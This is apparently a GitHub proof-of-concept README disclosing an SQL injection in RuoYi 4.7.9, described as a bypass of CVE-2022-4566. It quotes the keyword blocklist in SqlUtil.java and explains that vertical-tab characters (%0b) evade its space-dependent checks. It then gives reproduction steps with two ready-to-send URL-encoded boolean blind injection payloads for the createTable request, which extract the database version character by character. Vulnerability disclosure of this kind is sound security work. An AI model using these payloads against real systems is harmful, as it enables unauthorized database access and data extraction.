# Ruoyi-4.7.9-SQL-Injection-PoC
## Introduction
This is a bypass of CVE-2022-4566, due to insufficient validation in `ruoyi-common/src/main/java/com/ruoyi/common/utils/sql/SqlUtil.java` . The regex can be bypass by using `%0b` instead of spaces, this results in SQL Injection.

```java
public class SqlUtil
{
    /**
     * 定义常用的 sql关键字
     */
    public static String SQL_REGEX = "and |extractvalue|updatexml|sleep|exec |insert |select |delete |update |drop |count |chr |mid |master |truncate |char |declare |or |union |like |+|/*|user()";
    public static void filterKeyword(String value)
    {
        if (StringUtils.isEmpty(value))
        {
            return;
        }
        String[] sqlKeywords = StringUtils.split(SQL_REGEX, "\\|");
        for (String sqlKeyword : sqlKeywords)
        {
            if (StringUtils.indexOfIgnoreCase(value, sqlKeyword) > -1)
            {
                throw new UtilException("参数存在SQL注入风险");
            }
        }
    }
}
```
## Steps to reproduce Boolean SQL Injection
1. Log in as admin
2. Send createTable request   
   a. Inject a TRUE query: `sql=CREATE%20table%20j2iz96_666%20as%20SELECT%0b111%20FROM%20sys_job%20WHERE%201%3d0%20AND%0bIF(ascii(substring((select%0b%40%40version)%2c18%2c1))%3d45%2c%201%2c%201%2f0)%3b`
   ![true-query](https://github.com/user-attachments/assets/56d95c1b-409e-4bdc-8247-beabb2dadeae)
   b. Inject a FALSE query: `sql=CREATE%20table%20j2iz96_665%20as%20SELECT%0b111%20FROM%20sys_job%20WHERE%201%3d0%20AND%0bIF(ascii(substring((select%0b%40%40version)%2c5%2c1))%3d44%2c%201%2c%201%2f0)%3b`
   ![false-query](https://github.com/user-attachments/assets/308fba92-18b8-44ce-befa-584e5265cdae)
**Caution**:  Need to change tablename in the CREATE query after every successful query.



